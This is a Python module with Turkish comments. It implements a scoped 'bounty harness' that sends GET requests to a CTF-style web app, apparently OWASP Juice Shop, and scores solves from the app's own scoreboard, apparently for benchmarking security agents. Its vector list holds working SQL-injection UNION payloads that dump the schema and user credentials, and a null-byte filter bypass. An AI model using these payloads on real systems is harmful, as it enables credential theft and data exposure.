"""Bounty harness — kendi kendini hackleme, skorboard-doğrulamalı.

Desen (Cybench/EnIGMA/InterCode-CTF'den): ajan DENER; doğrulayıcı AGENT
DEĞİL, hedef uygulamanın kendi CTF skorboardudur (/api/challenges 'solved').
Yani yanlış-pozitif imkânsız değil ama çok zor: solve ancak sunucu kaydında
varsa sayılır. Ödül modeli BountyBench tarzı: challenge zorluğu → ödül.

Vektör seti: GET-only sızma denemeleri; her vektör hedefli bir challenge
sınıfına bağlanır. Vektör zenginleştikçe skor artar — ölçüm candır.
"""
from __future__ import annotations

import datetime as _dt
import json
from typing import Optional

from .audit import AuditLog
from .killswitch import KillSwitch
from .scope import ScopeContract

# ---------------------------------------------------------------------------
# Ödül haritası: CTF zorluğu (1-6) → rapor edilebilir ödül sınıfı
# ---------------------------------------------------------------------------

def difficulty_to_severity(d: int) -> str:
    if d <= 1:
        return "low"
    if d <= 2:
        return "medium"
    if d <= 3:
        return "high"
    return "critical"


# Basit ödül çarpanı (BountyBench'in dolar-etkisi yerine puan-etkisi)
_BOUNTY_POINTS = {"low": 100, "medium": 400, "high": 900, "critical": 2000}


def load_catalog(api_json: dict) -> list:
    """/api/challenges yanıtı → challenge kataloğu."""
    data = api_json.get("data") or api_json
    return [c for c in data if isinstance(c, dict) and "key" in c]


# ---------------------------------------------------------------------------
# Sızma vektörleri (GET-only; her biri bir challenge sınıfını hedefler)
# ---------------------------------------------------------------------------

BOUNTY_VECTORS = [
    {
        "id": "scoreboard",
        "path": "/score-board",
        "hedef_challenge": "scoreBoardChallenge",
        "aciklama": "gizli skorboard sayfası keşfi",
        "beklenen_status": 200,
    },
    {
        "id": "metrics",
        "path": "/metrics",
        "hedef_challenge": "metricsChallenge",
        "aciklama": "açık metrik endpoints",
        "beklenen_status": 200,
    },
    {
        "id": "ftp_listing",
        "path": "/ftp/",
        "hedef_challenge": "confidentialDocumentChallenge",
        "aciklama": "FTP dizin listeleme → gizli belge",
        "beklenen_status": 200,
    },
    {
        "id": "ftp_doc",
        "path": "/ftp/acquisitions.md",
        "hedef_challenge": "confidentialDocumentChallenge",
        "aciklama": "gizli M&A belgesi",
        "beklenen_status": 200,
    },
    {
        "id": "robots",
        "path": "/robots.txt",
        "hedef_challenge": None,
        "aciklama": "robotlar listesi (keşif)",
        "beklenen_status": 200,
    },
    {
        "id": "security_policy",
        "path": "/security.txt",
        "hedef_challenge": "securityPolicyChallenge",
        "aciklama": "güvenlik politikası dosyası",
        "beklenen_status": 200,
    },
    {
        "id": "db_schema_sqli",
        "path": "/rest/products/search?q='))%20union%20select%20sql,sql,sql,sql,sql,sql,sql,sql,sql%20from%20sqlite_master%20limit%201--",
        "hedef_challenge": "dbSchemaChallenge",
        "aciklama": "SQLi UNION ile veritabanı şeması sızdırma",
        "beklenen_status": 200,
        "kanit_imza": "CREATE TABLE",
    },
    {
        "id": "user_creds_sqli",
        "path": "/rest/products/search?q='))%20union%20select%20id,email,password,'a','a','a','a',999,'a'%20from%20Users--",
        "hedef_challenge": "userCredentialsChallenge",
        "aciklama": "SQLi UNION ile kullanıcı email/parola sızdırma",
        "beklenen_status": 200,
        "kanit_imza": "@",
    },
    {
        "id": "null_byte_bypass",
        "path": "/ftp/package.json.bak%2500.md",
        "hedef_challenge": "nullByteChallenge",
        "aciklama": "null-byte ile uzantı filtresi atlatma (Poison Null Byte)",
        "beklenen_status": 200,
        "kanit_imza": "dependencies",
    },
    {
        "id": "dev_backup",
        "path": "/ftp/eastere.gg",
        "hedef_challenge": "easterEggChallenge",
        "aciklama": "gizli easter egg dosyası",
        "beklenen_status": 200,
    },
]


class BountyHarness:
    """Dene → sunucu skorboardu doğrula → ödül topla."""

    def __init__(self, *, scope: ScopeContract, killswitch: KillSwitch,
                 audit: AuditLog, out_path: str, transport=None,
                 catalog_fetcher=None, catalog: Optional[list] = None,
                 vectors: Optional[list] = None):
        self.scope = scope
        self.killswitch = killswitch
        self.audit = audit
        self.out_path = out_path
        if transport is None:
            from .recon import RealTransport
            transport = RealTransport()
        self.tx = transport
        self.catalog_fetcher = catalog_fetcher  # () -> api_json
        self.catalog = catalog
        self.vectors = vectors or BOUNTY_VECTORS

    # ---- yardımcılar ----

    def _gate(self, host, port, method="GET") -> bool:
        ok, reason = self.scope.check_request(host=host, port=port, method=method)
        if not ok:
            self.audit.append("SCOPE_DENY", host=host, port=port, method=method,
                              reason=f"[bounty] {reason}")
            return False
        return True

    def _get(self, host, port, path):
        if not self._gate(host, port, "GET"):
            return None
        r = self.tx.http_get(host, port, path)
        if r is None:
            return None
        status, body, third = r
        if isinstance(third, str):
            third = {"server": third}
        return status, body, {k.lower(): v for k, v in third.items()}

    def _fetch_catalog(self, host, port) -> list:
        if self.catalog is not None:
            return [dict(c) for c in self.catalog]
        if self.catalog_fetcher is not None:
            return load_catalog(self.catalog_fetcher())
        r = self._get(host, port, "/api/challenges")
        if r and r[0] == 200:
            try:
                return load_catalog(json.loads(r[1]))
            except json.JSONDecodeError:
                return []
        return []

    def _emit(self, tip, hedef, kanit) -> dict:
        f = {"tip": tip, "hedef": hedef, "kanit": kanit[:500],
             "zaman_damgasi": _dt.datetime.now(_dt.timezone.utc).isoformat(timespec="seconds"),
             "kapsam_referansi": self.scope.targets[0]}
        with open(self.out_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(f, ensure_ascii=False) + "\n")
        self.audit.append("FINDING", tip=tip, hedef=hedef, kaynak="bounty")
        return f

    # ---- ana koşu ----

    def run(self, endpoints: list) -> dict:
        self.audit.append("BOUNTY_START",
                          endpoints=[f"{h}:{p}" for h, p in endpoints])
        if self.killswitch.is_active():
            self.audit.append("KILLSWITCH_HALT", stage="bounty")
            return {"cozulen": 0, "yeni": [], "solved": [],
                    "odul_toplami": 0, "halted": True}

        host, port = endpoints[0]
        before = self._fetch_catalog(host, port)
        solved_before = {c["key"] for c in before if c.get("solved")}

        # vektörleri sırayla dene (GET-only, her biri scope kapısından);
        # kanit_imza varsa gövdede o imza de ARANIR (200 yetmez — içerik kanıtı)
        for v in self.vectors:
            r = self._get(host, port, v["path"])
            if r and r[0] == v["beklenen_status"]:
                imza = v.get("kanit_imza")
                if imza is None or imza in r[1]:
                    self.audit.append("VECTOR_HIT", vektor=v["id"], path=v["path"][:120],
                                      status=r[0])

        # SUNUCU DOĞRULAMASI: skorboardu yeniden çek, fark = yeni çözülenler
        after = self._fetch_catalog(host, port)
        solved_after = {c["key"] for c in after if c.get("solved")}
        yeni = solved_after - solved_before
        cat_by_key = {c["key"]: c for c in after}

        odul = 0
        solved_rows = []
        for key in sorted(solved_after):
            c = cat_by_key.get(key, {})
            sev = difficulty_to_severity(int(c.get("difficulty", 1)))
            puan = _BOUNTY_POINTS[sev]
            odul += puan
            solved_rows.append({"key": key, "ad": c.get("name", key),
                                "zorluk": c.get("difficulty"),
                                "seviye": sev, "puan": puan})
            if key in yeni:
                self._emit("bounty_solve", f"{host}:{port}#{key}",
                           f"SUNUCU DOĞRULADI: '{c.get('name', key)}' çözüldü "
                           f"(zorluk {c.get('difficulty')}, ödül {puan}p)")

        result = {"cozulen": len(solved_after), "yeni": sorted(yeni),
                  "solved": solved_rows, "odul_toplami": odul, "halted": False}
        self.audit.append("BOUNTY_END", cozulen=len(solved_after),
                          yeni=len(yeni), odul=odul)
        return result


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main(argv=None) -> int:
    import argparse
    import os
    import sys
    ap = argparse.ArgumentParser(prog="purpleloop.bounty",
                                 description="Bounty harness: dene → skorboard doğrula → ödül")
    ap.add_argument("--scope", required=True)
    ap.add_argument("--targets", required=True, help="host:port")
    ap.add_argument("--out-dir", default="bounty-run")
    ap.add_argument("--killswitch", default="KILLSWITCH")
    args = ap.parse_args(argv)

    try:
        with open(args.scope, encoding="utf-8") as f:
            scope = ScopeContract(f.read())
    except Exception as e:
        print(f"FAIL-CLOSED: scope yüklenemedi: {e}", file=sys.stderr)
        return 2
    ks = KillSwitch(args.killswitch)
    if ks.is_active():
        print("FAIL-CLOSED: kill-switch aktif.", file=sys.stderr)
        return 3

    os.makedirs(args.out_dir, exist_ok=True)
    audit = AuditLog(os.path.join(args.out_dir, "audit.jsonl"))
    h = BountyHarness(scope=scope, killswitch=ks, audit=audit,
                      out_path=os.path.join(args.out_dir, "bounty-findings.jsonl"))
    eps = [tuple(t.rpartition(":")[::2]) for t in args.targets.split(",") if t]
    eps = [(hh, int(pp)) for hh, pp in eps]
    r = h.run(eps)
    print(json.dumps({**r, "audit_chain_valid": audit.verify_chain()},
                     ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
